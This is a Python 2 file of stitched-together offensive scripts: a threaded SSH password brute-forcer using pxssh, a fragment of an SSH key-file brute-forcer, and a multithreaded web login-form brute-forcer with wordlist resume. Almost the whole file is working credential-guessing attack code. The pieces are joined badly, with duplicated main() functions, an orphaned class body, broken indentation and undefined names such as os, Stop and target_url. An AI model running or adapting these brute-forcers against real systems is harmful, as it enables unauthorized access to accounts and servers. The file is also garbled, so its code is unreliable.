import pxssh
import optparse
import time
from threading import *

maxConnections = 6
connection_lock = BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0

def connect(host, user, password, release):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)

    finally:
        if release: connection_lock.release()

def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-H <target host> -u <user> -F <password list>'
                              )
    parser.add_option('-H', dest='tgtHost', type='string',\
      help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string',\
      help='specify password file')
    parser.add_option('-u', dest='user', type='string',\
      help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    if host == None or passwdFile == None or user == None:
        print parser.usage
        exit(0)

    fn = open(passwdFile, 'r')
    for line in fn.readlines():

        if Found:
            print "[*] Exiting: Password Found"
            exit(0)
        if Fails > 5:
            print "[!] Exiting: Too Many Socket Timeouts"
            exit(0)

        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print "[-] Testing: "+str(password)
        t = Thread(target=connect, args=(host, user,\
          password, True))
        child = t.start()

if __name__ == '__main__':
    main()

def main():
    parser = optparse.OptionParser('usage %prog -H '+\
      '<target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string',\
      help='specify target host')
    parser.add_option('-d', dest='passDir', type='string',\
      help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string',\
      help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user

    if host == None or passDir == None or user == None:
        print parser.usage
        exit(0)

    for filename in os.listdir(passDir):
        if Stop:
            print '[*] Exiting: Key Found.'
            exit(0)
        if Fails > 5:
            print '[!] Exiting: '+\
              'Too Many Connections Closed By Remote Host.'
            print '[!] Adjust number of simultaneous threads.'
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename)
        print '[-] Testing keyfile ' + str(fullpath)
        t = Thread(target=connect,\
          args=(user, host, fullpath, True))
        child = t.start()


if __name__ == '__main__':
    main()        
    self.username   = username
    self.password_q = words
    self.found      = False
        
    print "Finished setting up for: %s" % username
        
    def run_bruteforce(self):
        
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()
    
    def web_bruter(self):
        
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            
            response = opener.open(target_url)
            
            page = response.read()
            
            print "Trying: %s : %s (%d left)" % (self.username,brute,self.password_q.qsize())

            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)     
            
            post_tags = parser.tag_results
            
            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute
            
            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)
            
            login_result = login_response.read()
            
            
            if success_check in login_result:
                self.found = True
                
                print "[*] Bruteforce successful."
                print "[*] Username: %s" % username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."

def build_wordlist(wordlist_file):

    # read in the word list
    fd = open(wordlist_file,"rb") 
    raw_words = fd.readlines()
    fd.close()
    
    found_resume = False
    words        = Queue.Queue()
    
    for word in raw_words:
        
        word = word.rstrip()
        
        if resume is not None:
            
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print "Resuming wordlist from: %s" % resume
                                        
        else:
            words.put(word)
    
    return words            

words = build_wordlist(wordlist_file)


bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()


